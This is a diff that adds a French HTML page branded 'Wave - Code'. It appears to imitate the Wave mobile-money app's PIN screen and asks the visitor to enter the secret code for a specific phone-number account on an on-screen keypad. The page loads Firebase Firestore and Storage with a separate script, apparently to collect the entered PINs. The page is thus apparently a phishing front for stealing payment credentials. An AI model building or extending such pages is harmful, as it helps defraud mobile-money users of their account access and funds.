@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wave - Code</title>
+    <link rel="stylesheet" href="styles.css">
+    <!-- Chargez d'abord Firebase -->
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-firestore.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-storage.js"></script>
+    <!-- Puis votre configuration Firebase -->
+    <script src="firebase.js"></script>
+    <!-- Enfin votre code -->
+    <script src="script.js" defer></script>
+</head>
+<body>
+   
+    <div class="container" id="code-input">
+        <button class="back-button">←</button>
+        <img src="3.png" width="150px">
+        <h1>Entrez votre code secret pour le compte 05 76 06 03 64</h1>
+        
+        <div class="code-dots">
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+        </div>
+
+        <div class="keypad">
+            <button class="key" data-value="1">1</button>
+            <button class="key" data-value="2">2</button>
+            <button class="key" data-value="3">3</button>
+            <button class="key" data-value="4">4</button>
+            <button class="key" data-value="5">5</button>
+            <button class="key" data-value="6">6</button>
+            <button class="key" data-value="7">7</button>
+            <button class="key" data-value="8">8</button>
+            <button class="key" data-value="9">9</button>
+            <span class="forgot">OUBLIÉ?</span>
+            <button class="key" data-value="0">0</button>
+            <button class="key delete">✕</button>
+        </div>
+    </div>
+  
+</body>
+</html> 
